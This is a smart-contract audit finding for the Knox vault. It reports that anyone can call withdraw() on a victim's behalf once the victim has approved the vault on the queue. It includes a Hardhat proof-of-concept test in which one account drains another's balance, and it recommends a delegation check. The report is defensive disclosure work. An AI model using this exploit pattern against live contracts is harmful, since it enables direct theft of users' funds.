# [H] Users are left exposed after approving the vault address for funds withdrawal

## Summary
Severity: High
Reporter: CRYP70
Source: https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultBase.sol#L84
Type: audit-issue

## Details
# Users are left exposed after approving the vault address for funds withdrawal

## Summary
There exists a `vault.withdraw()` function which allows users to withdraw their assets from a vault and return the tokens back into their wallet. A user will call `Queue.setApprovalForAll(vault.address, true)` against the vault. Thinking that the vault has a friendly address, this actually exposes users to attack. 

## Vulnerability Detail
When the `vault` has been assigned to the  `queue` as `setApproveForAll`, this sets full approval rights given to an operator - in this instance the vault. If the vault is set to approved in the queue (as expected), any user can call `withdraw()` on the vault and steal another user's funds. 

## Impact
The result of this is the direct theft of user funds. In addition to this, once a user calls `setApprovalForAll()`, a user might forget to reset this back to false - as a result, an attacker could keep coming back and calling `withdraw()` using the victims address as the `owner` once again because there are no checks in the vault base. I have awarded this a "high" in severity because this results in a direct theft of funds where the adversary benefits a great deal at the cost of the victim. In addition to this, it's fairly trivial to execute the attack on a victim. 

## Code Snippet
https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultBase.sol#L84

## Proof of Concept
```javascript
it("should withdraw to attacker if auction has been processed", async () => {

	const mySigners = await ethers.getSigners();
	const eve = mySigners[10]; // Completely random unknown signer
	const alice = signers.lp1;
	
	await queue
		.connect(alice)
		.setApprovalForAll(vault.address, true);
	
	console.log("QUEUE VAULT BALANCE: " + ethers.utils.formatEther(await vault.balanceOf(queue.address)));
	
	console.log("BALANCE OF EVE BEFORE VAULT WITHDRAWAL: " + ethers.utils.formatEther(await vault.balanceOf(eve.address)));
	console.log("BALANCE OF ALICE BEFORE VAULT WITHDRAWAL: " + ethers.utils.formatEther(await vault.balanceOf(alice.address)));
	
	await vault
		.connect(eve)
		.withdraw(0, eve.address, alice.address);
	
	console.log("BALANCE OF EVE AFTER VAULT WITHDRAWAL: " + ethers.utils.formatEther( await vault.balanceOf(eve.address)));
	console.log("BALANCE OF ALICE AFTER VAULT WITHDRAWAL: " + ethers.utils.formatEther(await vault.balanceOf(alice.address)));
	
	await expect(Number(ethers.utils.formatEther(await vault.balanceOf(alice.address)))).to.equal(0.0);
	await expect(Number(ethers.utils.formatEther(await vault.balanceOf(eve.address)))).to.be.gte(10.0);
	
});
```
The test can be appended underneath `VaultBase.behaviour.ts:should permit withdrawals after withdrawal lock has been reset` .


## Tool used
Manual Review

## Recommendation
I recommend implementing a delegation system where users can elect another user(s) that they trust to withdraw funds on their behalf, then checking in the `VaultBase.sol` in the function of `withdraw()` that the calling user is either the owner or they have been delegated to withdraw as opposed to leaving victim funds totally exposed.
